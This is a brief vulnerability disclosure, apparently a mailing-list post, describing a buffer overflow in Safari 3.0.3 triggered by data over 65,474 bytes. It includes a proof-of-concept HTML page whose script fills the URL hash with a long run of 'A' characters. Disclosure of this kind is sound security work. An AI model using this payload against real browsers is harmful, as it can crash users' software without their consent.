Subject: Safari 3.0.3 (522.15.5)  Buffer overflow

Azizov E. (azizov@...efence.ru)

1. At processing of data, which has more than 65474 bytes in size, occurs buffer overflow.

POC:

<html>
<body>
<script>
var maxbuf = 65474;

buff = "A";
for (i=0;i<maxbuf;i++) { buff = buff+"A"; }
document.location.hash = buff+"BOW! ";
alert(document.location.hash);
</script>
</body>
</html>
